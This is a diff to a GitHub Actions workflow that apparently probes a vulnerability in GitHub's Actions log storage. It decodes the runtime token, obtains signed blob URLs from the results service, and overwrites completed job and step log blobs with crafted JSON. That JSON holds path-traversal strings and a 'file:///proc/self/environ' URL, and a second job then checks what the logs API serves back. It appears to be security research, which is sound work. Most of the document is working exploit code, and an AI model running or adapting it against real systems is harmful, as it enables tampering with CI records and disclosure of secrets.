@@ -1,4 +1,4 @@
-name: Probe live Actions log blob carrier
+name: Probe completed Actions log blob carrier
 on:
   workflow_dispatch:
 permissions:
@@ -7,9 +7,11 @@ permissions:
 jobs:
   carrier:
     runs-on: ubuntu-latest
-    timeout-minutes: 3
+    timeout-minutes: 4
     steps:
-      - name: Carrier probe
+      - name: Carrier seed
+        run: echo "seed log for carrier test"
+      - name: Overwrite completed log blobs
         uses: actions/github-script@v8
         env:
           GH_TOKEN: ${{ github.token }}
@@ -20,55 +22,80 @@ jobs:
             const runId = Number(process.env.GITHUB_RUN_ID);
             const runtime = process.env.ACTIONS_RUNTIME_TOKEN;
             const results = process.env.ACTIONS_RESULTS_URL;
-            if (!runtime || !results) throw new Error('Actions runtime token/URL missing');
             const claims = JSON.parse(Buffer.from(runtime.split('.')[1], 'base64url').toString());
-            const scope = claims.scp.split(' ').find(x => x.startsWith('Actions.Results:'));
-            const ids = {workflow_run_backend_id: scope.split(':')[1], workflow_job_run_backend_id: scope.split(':')[2]};
-            const base = 'https://api.github.com/repos/' + repo;
-            const headers = {Authorization: 'Bearer ' + process.env.GH_TOKEN, Accept: 'application/vnd.github.v3+json', 'User-Agent': 'own-live-log-probe'};
-            const jobsResponse = await fetch(base + '/actions/runs/' + runId + '/jobs?per_page=100', {headers});
-            if (!jobsResponse.ok) throw new Error('list jobs HTTP ' + jobsResponse.status);
-            const jobs = (await jobsResponse.json()).jobs;
-            const job = jobs.find(x => x.name === process.env.GITHUB_JOB);
-            const step = job && job.steps.find(x => x.name === 'Carrier probe');
-            if (!job || !step) throw new Error('current job/step not listed');
-            const payload = Buffer.from(JSON.stringify({full_name: 'x/../' + repo + '/actions/jobs/' + job.id + '/steps/' + step.number + '/logs', owner: {login: 'probe', avatar_url: 'file:///proc/self/environ'}, description: 'self-owned live log carrier test', stargazers_count: 7}));
+            const parts = claims.scp.split(' ').find(x => x.startsWith('Actions.Results:')).split(':');
+            const ids = {workflow_run_backend_id: parts[1], workflow_job_run_backend_id: parts[2]};
+            const gh = {Authorization: 'Bearer ' + process.env.GH_TOKEN, Accept: 'application/vnd.github+json', 'User-Agent': 'own-log-carrier-check'};
+            const api = 'https://api.github.com/repos/' + repo;
+            const list = await fetch(api + '/actions/runs/' + runId + '/jobs?per_page=100', {headers: gh});
+            if (!list.ok) throw new Error('jobs HTTP ' + list.status);
+            const jobs = (await list.json()).jobs;
+            const job = jobs.find(j => j.name === 'carrier') || jobs[0];
+            const seed = job?.steps?.find(s => s.name === 'Carrier seed');
+            if (!job || !seed) throw new Error('carrier seed step not in API: ' + JSON.stringify(jobs.map(j => ({name:j.name,steps:j.steps?.map(s=>s.name)}))));
+            const page = await fetch('https://github.com/' + repo + '/actions/runs/' + runId + '/job/' + job.id, {headers: {'User-Agent':'own-log-carrier-check'}});
+            const html = await page.text();
+            const i = html.indexOf('Carrier seed');
+            const fragment = html.slice(Math.max(0, i - 1400), i + 1800);
+            const stepBackend = fragment.match(/data-external-id="([0-9a-f-]{36})"/i)?.[1];
+            console.log('JOB=' + job.id + ' STEP=' + seed.number + ' STEP_BACKEND=' + (stepBackend || 'missing'));
             async function twirp(method, data) {
-              const response = await fetch(new URL('twirp/results.services.receiver.Receiver/' + method, results), {method: 'POST', headers: {Authorization: 'Bearer ' + runtime, 'Content-Type': 'application/json'}, body: JSON.stringify(data)});
-              const body = await response.text();
-              if (!response.ok) throw new Error(method + ' HTTP ' + response.status + ': ' + body.slice(0,180));
-              return JSON.parse(body);
+              const r = await fetch(new URL('twirp/results.services.receiver.Receiver/' + method, results), {method:'POST', headers:{Authorization:'Bearer ' + runtime, 'Content-Type':'application/json'}, body:JSON.stringify(data)});
+              const t = await r.text();
+              if (!r.ok) throw new Error(method + ' HTTP ' + r.status + ': ' + t.slice(0,160));
+              return JSON.parse(t);
             }
-            async function uploadAndRead(label, method, data, endpoint) {
-              try {
-                const signed = await twirp(method, data);
-                const url = signed.logs_url;
-                if (!url) throw new Error('no logs_url');
-                const sas = new URL(url);
-                const put = await fetch(url, {method: 'PUT', headers: {'x-ms-blob-type': 'BlockBlob', 'Content-Type': 'application/json\u0085', 'x-ms-version': '2023-11-03'}, body: payload});
-                console.log(label + ' PUT=' + put.status + ' azure=' + (put.headers.get('x-ms-error-code') || '') + ' sp=' + sas.searchParams.get('sp') + ' host=' + sas.host);
-                await put.arrayBuffer();
-                let last = null;
-                for (let i = 0; i < 25; i++) {
-                  const first = await fetch(endpoint, {headers, redirect: 'manual'});
-                  if (first.status === 302 && first.headers.get('location')) {
-                    const raw = await fetch(first.headers.get('location'));
-                    const body = Buffer.from(await raw.arrayBuffer());
-                    const type = raw.headers.get('content-type') || '';
-                    let json = false; try { JSON.parse(body.toString('utf8')); json = true; } catch {}
-                    console.log(label + ' API=302 RAW=' + raw.status + ' MIME=' + JSON.stringify(type) + ' N=' + body.length + ' JSON=' + json + ' EXACT=' + body.equals(payload) + ' HEAD=' + body.subarray(0,16).toString('hex'));
-                    return;
-                  }
-                  last = first.status + ' ' + (first.headers.get('content-type') || '');
-                  await first.body?.cancel();
-                  await new Promise(r => setTimeout(r, 200));
-                }
-                console.log(label + ' no redirect after polling; final=' + last);
-              } catch (error) { console.log(label + ' ERROR=' + error.message); }
+            async function put(label, method, data, body) {
+              const signed = await twirp(method, data);
+              const u = signed.logs_url;
+              if (!u) throw new Error(label + ' missing logs_url');
+              const r = await fetch(u, {method:'PUT', headers:{'x-ms-blob-type':'BlockBlob','Content-Type':'application/json\u0085','x-ms-version':'2023-11-03'}, body});
+              console.log(label + '_PUT=' + r.status + ' SP=' + new URL(u).searchParams.get('sp'));
+              await r.arrayBuffer();
             }
-            const jobPage = await fetch('https://github.com/' + repo + '/actions/runs/' + runId + '/job/' + job.id, {headers: {'User-Agent': 'own-live-log-probe'}});
-            const html = await jobPage.text();
-            const stepMatch = new RegExp('data-name="Run actions/github-script@v8"[\\s\\S]{0,1600}?data-external-id="([0-9a-f-]{36})"', 'i').exec(html);
-            console.log('JOB=' + job.id + ' STEP=' + step.number + ' STEP_BACKEND=' + (stepMatch ? stepMatch[1] : 'missing') + ' PAYLOAD=' + payload.length);
-            await uploadAndRead('JOB_LOG', 'GetJobLogsSignedBlobURL', ids, base + '/actions/jobs/' + job.id + '/logs');
-            if (stepMatch) await uploadAndRead('STEP_LOG', 'GetStepLogsSignedBlobURL', {...ids, step_backend_id: stepMatch[1]}, base + '/actions/jobs/' + job.id + '/steps/' + step.number + '/logs');
+            const jobPath = 'x/../../repos/' + repo + '/actions/jobs/' + job.id + '/logs';
+            const jobBody = Buffer.from(JSON.stringify({full_name:jobPath,owner:{login:'probe',avatar_url:'file:///proc/self/environ'},description:'completed job-log carrier',stargazers_count:7}));
+            await put('JOB_LOG', 'GetJobLogsSignedBlobURL', ids, jobBody);
+            if (stepBackend) {
+              const stepPath = 'x/../../repos/' + repo + '/actions/jobs/' + job.id + '/steps/' + seed.number + '/logs';
+              const stepBody = Buffer.from(JSON.stringify({full_name:stepPath,owner:{login:'probe',avatar_url:'file:///proc/self/environ'},description:'completed step-log carrier',stargazers_count:7}));
+              await put('STEP_LOG', 'GetStepLogsSignedBlobURL', {...ids,step_backend_id:stepBackend}, stepBody);
+            }
+            core.setOutput('job_id', String(job.id));
+  verify:
+    needs: carrier
+    runs-on: ubuntu-latest
+    steps:
+      - name: Read completed log endpoints
+        uses: actions/github-script@v8
+        env:
+          GH_TOKEN: ${{ github.token }}
+        with:
+          github-token: ${{ github.token }}
+          script: |
+            const repo = process.env.GITHUB_REPOSITORY;
+            const runId = Number(process.env.GITHUB_RUN_ID);
+            const gh = {Authorization:'Bearer ' + process.env.GH_TOKEN,Accept:'application/vnd.github+json','User-Agent':'own-log-carrier-check'};
+            const api = 'https://api.github.com/repos/' + repo;
+            const list = await fetch(api + '/actions/runs/' + runId + '/jobs?per_page=100',{headers:gh});
+            if (!list.ok) throw new Error('jobs HTTP ' + list.status);
+            const jobs = (await list.json()).jobs;
+            const job = jobs.find(j=>j.name==='carrier');
+            if (!job) throw new Error('carrier job missing');
+            async function inspect(label, endpoint, expected) {
+              const first = await fetch(endpoint,{headers:gh,redirect:'manual'});
+              const loc = first.headers.get('location');
+              if (first.status !== 302 || !loc) { console.log(label + ' API=' + first.status + ' TYPE=' + first.headers.get('content-type')); return; }
+              const raw = await fetch(loc,{redirect:'manual'});
+              const body = Buffer.from(await raw.arrayBuffer());
+              const type = raw.headers.get('content-type') || '';
+              console.log(label + ' API=302 RAW=' + raw.status + ' MIME=' + JSON.stringify(type) + ' N=' + body.length + ' EXACT=' + body.equals(expected) + ' HEAD=' + body.subarray(0,24).toString('hex'));
+            }
+            const seed = job.steps.find(s=>s.name==='Carrier seed');
+            if (!seed) throw new Error('carrier seed step missing: ' + JSON.stringify(job.steps));
+            const jobPath = 'x/../../repos/' + repo + '/actions/jobs/' + job.id + '/logs';
+            const jobBody = Buffer.from(JSON.stringify({full_name:jobPath,owner:{login:'probe',avatar_url:'file:///proc/self/environ'},description:'completed job-log carrier',stargazers_count:7}));
+            const stepPath = 'x/../../repos/' + repo + '/actions/jobs/' + job.id + '/steps/' + seed.number + '/logs';
+            const stepBody = Buffer.from(JSON.stringify({full_name:stepPath,owner:{login:'probe',avatar_url:'file:///proc/self/environ'},description:'completed step-log carrier',stargazers_count:7}));
+            await inspect('JOB_LOG',api + '/actions/jobs/' + job.id + '/logs',jobBody);
+            await inspect('STEP_LOG',api + '/actions/jobs/' + job.id + '/steps/' + seed.number + '/logs',stepBody);
